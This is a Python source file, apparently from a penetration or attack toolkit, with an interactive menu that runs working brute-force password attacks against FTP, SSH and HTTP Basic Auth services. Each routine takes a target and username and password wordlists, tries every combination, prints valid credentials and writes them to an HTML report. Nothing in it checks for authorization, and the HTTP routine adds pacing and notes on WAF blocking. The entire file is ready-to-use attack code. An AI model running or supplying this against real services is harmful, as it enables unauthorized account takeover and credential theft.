import ftplib
import os
import paramiko
import requests # Added for HTTP requests
from requests.auth import HTTPBasicAuth # Added for Basic Auth
from datetime import datetime
import time
import random
from utils.reporter import write_html_section


def clear():
    os.system("cls" if os.name == "nt" else "clear")

def run_ftp_bruteforce():
    clear()
    print("\n🔐 [FTP Brute-Force]")

    while True:
        target = input("Enter FTP IP or domain: ").strip()
        if not target:
            print("[❌] Target cannot be empty.")
        else:
            break  # Add more sophisticated validation if needed (e.g., regex for IP/domain)

    while True:
        port_str = input("Enter port (default 21): ").strip()
        if not port_str:
            port = 21
            break
        try:
            port = int(port_str)
            if 1 <= port <= 65535:
                break
            else:
                print("[❌] Port must be between 1 and 65535.")
        except ValueError:
            print("[❌] Invalid port number.")

    usernames = []
    userlist_path_for_report = "N/A (Single Username)" # For reporting

    while True:
        know_username = input("Do you know a specific username? (y/n, default n): ").strip().lower()
        if know_username == 'y':
            single_username = input("Enter the username: ").strip()
            if not single_username:
                print("[❌] Username cannot be empty.")
                continue
            usernames = [single_username]
            break
        else: # 'n' or anything else, proceed to ask for wordlist
            userlist_path_input = input("Path to username wordlist (e.g. wordlists/users.txt): ").strip()
            if not userlist_path_input:
                print("[❌] Username wordlist path cannot be empty.")
                continue # Re-ask "know_username" or path. Here, re-asks "know_username".
            elif not os.path.exists(userlist_path_input):
                print(f"[❌] Username wordlist file not found: {userlist_path_input}")
                continue
            else:
                try:
                    with open(userlist_path_input, 'r', encoding='utf-8', errors='ignore') as ufile:
                        loaded_usernames = [u.strip() for u in ufile if u.strip()]
                    if not loaded_usernames:
                        print(f"[❌] Username wordlist '{userlist_path_input}' is empty.")
                        continue
                    usernames = loaded_usernames
                    userlist_path_for_report = userlist_path_input # Save for reporting
                    break
                except Exception as e:
                    print(f"[❌] Error reading username wordlist: {e}")
                    continue # Re-ask "know_username"

    passwords = []
    passlist_path = "" # Initialize for use in reporting
    while True:
        passlist_path_input = input("Path to password wordlist (e.g. wordlists/passwords.txt): ").strip()
        if not passlist_path_input:
            print("[❌] Password wordlist path cannot be empty.")
            continue
        elif not os.path.exists(passlist_path_input):
            print(f"[❌] Password wordlist file not found: {passlist_path_input}")
            continue
        else:
            try:
                with open(passlist_path_input, 'r', encoding='utf-8', errors='ignore') as pfile:
                    loaded_passwords = [p.strip() for p in pfile if p.strip()]
                if not loaded_passwords:
                    print(f"[❌] Password wordlist '{passlist_path_input}' is empty.")
                    continue
                passwords = loaded_passwords
                passlist_path = passlist_path_input # Save for reporting
                break
            except Exception as e:
                print(f"[❌] Error reading password wordlist: {e}")
                continue

    # Wordlists (usernames and passwords) are now loaded and validated.

    print(f"\n[🔍] Starting FTP brute-force on {target}:{port} with {len(usernames)} username(s) and {len(passwords)} password(s)...\n")
    start_time = time.time()
    found_credentials = None

    try:
        for current_username in usernames: # Iterate over the (potentially single) username
            for password in passwords:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(target, port, timeout=3)
                    ftp.login(current_username, password)
                    print(f"[✅] SUCCESS: {current_username}:{password}")
                    ftp.quit()
                    found_credentials = f"{current_username}:{password}"
                    raise StopIteration # Signal to break from both loops
                except ftplib.error_perm:
                    print(f"[❌] Failed: {current_username}:{password}")
                except Exception as e:
                    print(f"[⚠️ ] Error: {e}")
                    # For FTP, an error during login might mean the user/pass is wrong,
                    # or a connection issue. Continuing to next password might be okay,
                    # but for simplicity breaking inner loop on general errors.
                    break # Break from password loop for this username
            if found_credentials: # If found in inner loop, break outer username loop
                break
    except StopIteration: # Custom signal to break from nested loops
        pass
    finally:
        end_time = time.time()
        duration = round(end_time - start_time, 2)

        report_lines = [
            f"Target: {target}:{port}",
            f"Service: FTP",
            f"Scan Duration: {duration} seconds",
        ]
        if len(usernames) == 1 and userlist_path_for_report == "N/A (Single Username)":
            report_lines.append(f"Username: {usernames[0]}")
        else:
            report_lines.append(f"Username Wordlist: {userlist_path_for_report}")

        report_lines.append(f"Password Wordlist: {passlist_path}") # This was correctly assigned

        if found_credentials:
            report_lines.append(f"Outcome: Credentials Found")
            report_lines.append(f"Credentials: {found_credentials}")
            status_message = "[✅] Credentials found and reported."
        else:
            report_lines.append(f"Outcome: No Credentials Found")
            status_message = "[❌] No valid credentials found. Report generated."

        write_html_section("FTP Brute-Force Results", report_lines)
        print(f"\n[💾] {status_message} Appended to report.html")
        input("Press Enter to return...")

import os, time, random, paramiko
from tqdm import tqdm  # install with: pip install tqdm

def run_ssh_bruteforce():
    clear()
    # Description will be updated in a later step in the plan.
    print("\n🔐 [SSH Brute-Force]")

    while True:
        target = input("Enter SSH IP or domain: ").strip()
        if not target:
            print("[❌] Target cannot be empty.")
        else:
            break # Add more sophisticated validation if needed

    while True:
        port_str = input("Enter port (default 22): ").strip()
        if not port_str:
            port = 22
            break
        try:
            port = int(port_str)
            if 1 <= port <= 65535:
                break
            else:
                print("[❌] Port must be between 1 and 65535.")
        except ValueError:
            print("[❌] Invalid port number.")

    usernames = []
    userlist_path_for_report = "N/A (Single Username)"

    while True:
        know_username = input("Do you know a specific username? (y/n, default n): ").strip().lower()
        if know_username == 'y':
            single_username = input("Enter the username: ").strip()
            if not single_username:
                print("[❌] Username cannot be empty.")
                continue
            usernames = [single_username]
            break
        else: # 'n' or anything else, proceed to ask for wordlist
            userlist_path_input = input("Path to username wordlist (e.g. wordlists/users.txt): ").strip()
            if not userlist_path_input:
                print("[❌] Username wordlist path cannot be empty.")
                continue
            elif not os.path.exists(userlist_path_input):
                print(f"[❌] Username wordlist file not found: {userlist_path_input}")
                continue
            else:
                try:
                    with open(userlist_path_input, 'r', encoding='utf-8', errors='ignore') as ufile:
                        loaded_usernames = [u.strip() for u in ufile if u.strip()]
                    if not loaded_usernames:
                        print(f"[❌] Username wordlist '{userlist_path_input}' is empty.")
                        continue
                    usernames = loaded_usernames
                    userlist_path_for_report = userlist_path_input
                    break
                except Exception as e:
                    print(f"[❌] Error reading username wordlist: {e}")
                    continue

    passwords = []
    passlist_path = "" # Initialize for use in reporting
    while True:
        passlist_path_input = input("Path to password wordlist: ").strip()
        if not passlist_path_input:
            print("[❌] Password wordlist path cannot be empty.")
            continue
        elif not os.path.exists(passlist_path_input):
            print(f"[❌] Password wordlist file not found: {passlist_path_input}")
            continue
        else:
            try:
                with open(passlist_path_input, "r", encoding="utf-8", errors="ignore") as f:
                    loaded_passwords = [line.strip() for line in f if line.strip()]
                if not loaded_passwords:
                    print(f"[❌] Password wordlist '{passlist_path_input}' is empty.")
                    continue
                passwords = loaded_passwords
                passlist_path = passlist_path_input
                break
            except Exception as e:
                print(f"[❌] Error reading password wordlist: {e}")
                continue

    print(f"\n[🔍] Starting SSH brute-force on {target}:{port} with {len(usernames)} username(s) and {len(passwords)} password(s)...\n")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    start_time = time.time()
    found_credentials_ssh = None # Renamed to avoid conflict with other functions' variable

    try:
        for current_username in tqdm(usernames, desc="Usernames", unit="user", leave=len(usernames)>1):
            # Only show password progress bar if there's one username, otherwise it's too noisy.
            password_iterator = tqdm(passwords, desc=f"Trying passwords for {current_username}", unit="pw", leave=False) if len(usernames) == 1 else passwords
            for password in password_iterator:
                try:
                    # Ensure client is freshly connected for each attempt if not already connected
                    # or if previous attempt failed in a way that closed it.
                    # For simplicity, we'll attempt to connect each time.
                    # More advanced logic could reuse connections if appropriate for the server.
                    if client._transport and client._transport.is_active():
                        client.close() # Close previous connection if any

                    client.connect(
                        hostname=target,
                        port=port,
                        username=current_username,
                        password=password,
                        timeout=5,
                        auth_timeout=5,
                        banner_timeout=5,
                        allow_agent=False,
                        look_for_keys=False
                    )
                    tqdm.write(f"\n[✅] SUCCESS! Credentials: {current_username}:{password}")
                    found_credentials_ssh = f"{current_username}:{password}"
                    client.close()
                    raise StopIteration # Signal to break all loops
                except paramiko.AuthenticationException:
                    if len(usernames) > 1 and isinstance(password_iterator, type(passwords)): # only print if not using tqdm for passwords
                        tqdm.write(f"[❌] Failed: {current_username}:{password}")
                    # If using tqdm for passwords (single user), failed attempts are implicitly shown by progress.
                    pass  # invalid login, ignore
                except paramiko.SSHException as e:
                    tqdm.write(f"[⚠️ ] SSH error for {current_username}:{password}. Server busy or config issue: {e}")
                    time.sleep(random.uniform(5, 10)) # Wait a bit
                    # Depending on the error, may want to break inner or outer loop
                    # For now, break password loop for this user if SSH error occurs
                    break
                except Exception as e:
                    tqdm.write(f"[❌] Unexpected error for {current_username}:{password}: {e}")
                    break # Break password loop for this user
                finally:
                    if client._transport and client._transport.is_active():
                        client.close()
            if found_credentials_ssh:
                break # Break username loop
    except StopIteration: # Handles breaking from nested loops
        pass
    finally:
        # Ensure client is closed if loops exited unexpectedly or after completion
        if client._transport and client._transport.is_active():
            client.close()

        end_time = time.time()
        duration = round(end_time - start_time, 2)

        report_lines = [
            f"Target: {target}:{port}",
            f"Service: SSH",
            f"Scan Duration: {duration} seconds",
        ]

        if len(usernames) == 1 and userlist_path_for_report == "N/A (Single Username)":
            report_lines.append(f"Username: {usernames[0]}")
        else:
            report_lines.append(f"Username Wordlist: {userlist_path_for_report}")

        report_lines.append(f"Password Wordlist: {passlist_path}")

        if found_credentials_ssh:
            report_lines.append(f"Outcome: Credentials Found")
            report_lines.append(f"Credentials: {found_credentials_ssh}")
            status_message = "[✅] Credentials found and reported."
        else:
            report_lines.append(f"Outcome: No Credentials Found")
            status_message = "[❌] No valid credentials found. Report generated."
            # This print was originally after the loop, moving it here to be part of the final status
            # Only print if no creds found and not aborted by other error (e.g. connection error)
            if not found_credentials_ssh: # Check if we should print this
                 tqdm.write("\n[❌] No valid credentials found across all attempts.")


        write_html_section("SSH Brute-Force Results", report_lines)
        print(f"\n[💾] {status_message} Appended to report.html")
        input("Press Enter to return...")


def run_http_bruteforce():
    clear()
    print("\n🔐 [HTTP Basic Auth Brute-Force]")

    while True:
        target_url = input("Enter Target URL (e.g., http://example.com/protected): ").strip()
        if not target_url:
            print("[❌] Target URL cannot be empty.")
        # Basic check for http/https prefix, can be more sophisticated
        elif not (target_url.startswith("http://") or target_url.startswith("https://")):
            print("[❌] Invalid URL format. Please include http:// or https://")
        else:
            break

    usernames = []
    userlist_path_for_report = "N/A (Single Username)"

    while True:
        know_username = input("Do you know a specific username? (y/n, default n): ").strip().lower()
        if know_username == 'y':
            single_username = input("Enter the username: ").strip()
            if not single_username:
                print("[❌] Username cannot be empty.")
                continue
            usernames = [single_username]
            break
        else: # 'n' or anything else, proceed to ask for wordlist
            userlist_path_input = input("Path to username wordlist (e.g. wordlists/users.txt): ").strip()
            if not userlist_path_input:
                print("[❌] Username wordlist path cannot be empty.")
                continue
            elif not os.path.exists(userlist_path_input):
                print(f"[❌] Username wordlist file not found: {userlist_path_input}")
                continue
            else:
                try:
                    with open(userlist_path_input, 'r', encoding='utf-8', errors='ignore') as ufile:
                        loaded_usernames = [u.strip() for u in ufile if u.strip()]
                    if not loaded_usernames:
                        print(f"[❌] Username wordlist '{userlist_path_input}' is empty.")
                        continue
                    usernames = loaded_usernames
                    userlist_path_for_report = userlist_path_input
                    break
                except Exception as e:
                    print(f"[❌] Error reading username wordlist: {e}")
                    continue

    passwords = []
    passlist_path = "" # Initialize for use in reporting
    while True:
        passlist_path_input = input("Path to password wordlist (e.g. wordlists/passwords.txt): ").strip()
        if not passlist_path_input:
            print("[❌] Password wordlist path cannot be empty.")
            continue
        elif not os.path.exists(passlist_path_input):
            print(f"[❌] Password wordlist file not found: {passlist_path_input}")
            continue
        else:
            try:
                with open(passlist_path_input, 'r', encoding='utf-8', errors='ignore') as pfile:
                    loaded_passwords = [p.strip() for p in pfile if p.strip()]
                if not loaded_passwords:
                    print(f"[❌] Password wordlist '{passlist_path_input}' is empty.")
                    continue
                passwords = loaded_passwords
                passlist_path = passlist_path_input
                break
            except Exception as e:
                print(f"[❌] Error reading password wordlist: {e}")
                continue

    if not usernames or not passwords: # Should not happen if loops above work correctly
        print("[❌] Usernames or passwords list is empty. This should be caught earlier.")
        input("Press Enter to return...")
        return

    print(f"\n[🔍] Starting HTTP Basic Auth brute-force on {target_url} with {len(usernames)} username(s) and {len(passwords)} password(s)...\n")
    start_time = time.time()
    found_credentials = None
    connection_error_occurred = False

    try:
        # Adjust tqdm behavior based on number of usernames
        username_iterator = tqdm(usernames, desc="Usernames", unit="user", leave=len(usernames)>1) if len(usernames) > 1 else usernames

        for current_username in username_iterator:
            # Show password progress bar only if there's one username
            password_iterator = tqdm(passwords, desc=f"Passwords for {current_username}", unit="pass", leave=False) if len(usernames) == 1 else passwords

            for password in password_iterator:
                try:
                    response = requests.get(target_url, auth=HTTPBasicAuth(current_username, password), timeout=5)

                    if response.status_code == 200:
                        tqdm.write(f"\n[✅] SUCCESS: {current_username}:{password} (Status: {response.status_code})")
                        found_credentials = f"{current_username}:{password}"
                        raise StopIteration # Signal to break from loops
                    elif response.status_code == 401:
                        if len(usernames) > 1 or not isinstance(password_iterator, tqdm): # Print if not using detailed password tqdm
                           tqdm.write(f"[❌] Failed: {current_username}:{password} (Status: {response.status_code} Unauthorized)")
                        # else: tqdm implies failure for single user
                    elif response.status_code == 403:
                        tqdm.write(f"[❌] Failed: {current_username}:{password} (Status: {response.status_code} Forbidden) - This might indicate IP ban or WAF block.")
                        # Consider breaking more loops if 403 is persistent
                    else:
                        tqdm.write(f"[⚠️ ] Info: {current_username}:{password} (Status: {response.status_code})")

                except requests.exceptions.ConnectionError:
                    tqdm.write(f"[❌] Error: Could not connect to {target_url}. Check URL and connection.")
                    connection_error_occurred = True
                    raise StopIteration # Signal to break from loops and go to finally
                except requests.exceptions.Timeout:
                    tqdm.write(f"[⚠️ ] Timeout for {current_username}:{password}. Server might be slow or rate-limiting.")
                except requests.exceptions.RequestException as e:
                    tqdm.write(f"[❌] Request error for {current_username}:{password}: {e}")
                    # Depending on the error, might want to break
                    break # Break password loop for this user on other request errors

                if found_credentials or connection_error_occurred:
                    break # Break inner password loop

                time.sleep(0.1) # Small delay

            if found_credentials or connection_error_occurred:
                break # Break outer username loop

    except StopIteration: # Handles breaking from nested loops
        pass
    finally:
        end_time = time.time()
        duration = round(end_time - start_time, 2)

        report_lines = [
            f"Target URL: {target_url}",
            f"Service: HTTP Basic Auth",
            f"Scan Duration: {duration} seconds",
        ]
        if len(usernames) == 1 and userlist_path_for_report == "N/A (Single Username)":
            report_lines.append(f"Username: {usernames[0]}")
        else:
            report_lines.append(f"Username Wordlist: {userlist_path_for_report}")

        report_lines.append(f"Password Wordlist: {passlist_path}")


        if connection_error_occurred:
            report_lines.append("Outcome: Connection Error")
            report_lines.append("Details: Could not connect to the target URL. Scan aborted.")
            status_message = "[❌] Connection error. Report generated."
        elif found_credentials:
            report_lines.append("Outcome: Credentials Found")
            report_lines.append(f"Credentials: {found_credentials}")
            status_message = "[✅] Credentials found and reported."
        else:
            report_lines.append("Outcome: No Credentials Found")
            status_message = "[❌] No valid credentials found. Report generated."
            if not connection_error_occurred: # Only print if not a connection error
                tqdm.write("\n[❌] No valid credentials found.")


        write_html_section("HTTP Basic Auth Brute-Force Results", report_lines)
        print(f"\n[💾] {status_message} Appended to report.html")
        input("Press Enter to return...")


def run():
    print("🔐 Brute-Force Toolkit") 
    print("[1] FTP Brute-Force")
    print("[2] SSH Brute-Force")
    print("[3] HTTP Basic Auth Brute-Force")
    print("[4] Back")
    choice = input("Select an option: ").strip()

    if choice == '1':
        run_ftp_bruteforce()
    elif choice == '2':
        run_ssh_bruteforce()
    elif choice == '3':
        run_http_bruteforce()
    elif choice == '4':
        return